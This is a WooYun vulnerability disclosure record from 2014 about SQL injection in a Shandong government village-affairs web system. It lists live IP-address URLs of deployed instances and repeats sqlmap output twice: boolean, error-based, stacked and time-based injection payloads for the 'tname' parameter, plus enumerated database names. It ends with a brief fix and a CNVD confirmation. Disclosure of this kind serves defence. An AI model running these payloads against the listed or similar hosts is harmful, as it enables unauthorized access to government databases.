{"id": 41224, "wybug_id": "wooyun-2014-089531", "wybug_title": "某政府系统一处SQL注入#2", "wybug_corp": "山东农友软件", "wybug_author": "路人甲", "wybug_date": "2014-12-31 18:11", "wybug_open_date": "2015-03-31 18:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-31：\t细节向公众公开  简要描述： RT 详细说明：  山东农友软件公司官网:http://www.nongyou.com.cn/案例如下：http://222.135.76.147:8200/ckq/jwhkzjdlist.aspx?tname=宁津办事处&CountryName=所前王家http://60.217.72.17:7117/ckq/jwhkzjdlist.aspx?tname=山头办&CountryName=河北西社区http://218.58.124.131:8003/ckq/jwhkzjdlist.aspx?tname=综合保税物流片区&CountryName=北岭村http://218.56.40.229:8013/ckq/jwhkzjdlist.aspx?tname=昆嵛镇&CountryName=滩上http://218.56.99.84:8003/ckq/jwhkzjdlist.aspx?tname=昆仑镇&CountryName=河石坞村http://222.134.154.214:8001/ckq/jwhkzjdlist.aspx?tname=大张庄镇&CountryName=胜利村1.测试注入点:http://222.134.154.214:8001/ckq/jwhkzjdlist.aspx?tname=大张庄镇&CountryName=胜利村\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: tname    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: tname=????' RLIKE (SELECT (CASE WHEN (9506=9506) THEN CONVERT(0xe5a4a7e5bca0e5ba84e99587 USING utf8) ELSE 0x28 END)) AND 'Jfto'='Jfto&CountryName=???    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: tname=????' AND (SELECT 1011 FROM(SELECT COUNT(*),CONCAT(0x716c626371,(SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0 END)),0x7179687571,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'pobb'='pobb&CountryName=???    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: tname=????'; SELECT SLEEP(5)-- &CountryName=???    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: tname=????' AND SLEEP(5) AND 'jMaG'='jMaG&CountryName=???---[17:18:08] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: MySQL 5.0[17:18:08] [INFO] fetching database names[17:18:13] [INFO] the SQL query used returns 658 entries[17:18:13] [INFO] retrieved: information_schema[17:18:13] [INFO] retrieved: cw_databasecomm22yiyuanxian[17:18:13] [INFO] retrieved: cw_databasecommzbyiyuanxian[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100012[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100015[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100030[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100031[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100041[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100042[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100043[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100044[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100046[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100047[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100048[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100055[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100060[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100061[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100063[17:18:14] [WARNING] user aborted during enumeration. sqlmap will display partial outputavailable databases [18]:[*] cw_databasecomm22yiyuanxian[*] cw_databasecommzbyiyuanxian[*] cwdbcommzbyiyuanxian100012[*] cwdbcommzbyiyuanxian100015[*] cwdbcommzbyiyuanxian100030[*] cwdbcommzbyiyuanxian100031[*] cwdbcommzbyiyuanxian100041[*] cwdbcommzbyiyuanxian100042[*] cwdbcommzbyiyuanxian100043[*] cwdbcommzbyiyuanxian100044[*] cwdbcommzbyiyuanxian100046[*] cwdbcommzbyiyuanxian100047[*] cwdbcommzbyiyuanxian100048[*] cwdbcommzbyiyuanxian100055[*] cwdbcommzbyiyuanxian100060[*] cwdbcommzbyiyuanxian100061[*] cwdbcommzbyiyuanxian100063[*] information_schema[17:18:14] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 19 times[17:18:14] [INFO] fetched data logged to text files under 'C:\\Documents and Settings\\Administrator\\.sqlmap\\output\\222.134.154.214'\n均可复现。   漏洞证明：  1.测试注入点:http://222.134.154.214:8001/ckq/jwhkzjdlist.aspx?tname=大张庄镇&CountryName=胜利村\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: tname    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: tname=????' RLIKE (SELECT (CASE WHEN (9506=9506) THEN CONVERT(0xe5a4a7e5bca0e5ba84e99587 USING utf8) ELSE 0x28 END)) AND 'Jfto'='Jfto&CountryName=???    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: tname=????' AND (SELECT 1011 FROM(SELECT COUNT(*),CONCAT(0x716c626371,(SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0 END)),0x7179687571,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'pobb'='pobb&CountryName=???    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: tname=????'; SELECT SLEEP(5)-- &CountryName=???    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: tname=????' AND SLEEP(5) AND 'jMaG'='jMaG&CountryName=???---[17:18:08] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: MySQL 5.0[17:18:08] [INFO] fetching database names[17:18:13] [INFO] the SQL query used returns 658 entries[17:18:13] [INFO] retrieved: information_schema[17:18:13] [INFO] retrieved: cw_databasecomm22yiyuanxian[17:18:13] [INFO] retrieved: cw_databasecommzbyiyuanxian[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100012[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100015[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100030[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100031[17:18:13] [INFO] retrieved: cwdbcommzbyiyuanxian100041[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100042[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100043[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100044[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100046[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100047[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100048[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100055[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100060[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100061[17:18:14] [INFO] retrieved: cwdbcommzbyiyuanxian100063[17:18:14] [WARNING] user aborted during enumeration. sqlmap will display partial outputavailable databases [18]:[*] cw_databasecomm22yiyuanxian[*] cw_databasecommzbyiyuanxian[*] cwdbcommzbyiyuanxian100012[*] cwdbcommzbyiyuanxian100015[*] cwdbcommzbyiyuanxian100030[*] cwdbcommzbyiyuanxian100031[*] cwdbcommzbyiyuanxian100041[*] cwdbcommzbyiyuanxian100042[*] cwdbcommzbyiyuanxian100043[*] cwdbcommzbyiyuanxian100044[*] cwdbcommzbyiyuanxian100046[*] cwdbcommzbyiyuanxian100047[*] cwdbcommzbyiyuanxian100048[*] cwdbcommzbyiyuanxian100055[*] cwdbcommzbyiyuanxian100060[*] cwdbcommzbyiyuanxian100061[*] cwdbcommzbyiyuanxian100063[*] information_schema[17:18:14] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 19 times[17:18:14] [INFO] fetched data logged to text files under 'C:\\Documents and Settings\\Administrator\\.sqlmap\\output\\222.134.154.214'\n   修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-01-05 08:15 厂商回复： CNVD确认并复现所述情况,已经由CNVD按以往联系渠道向软件生产厂商_山东农友公司通报. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}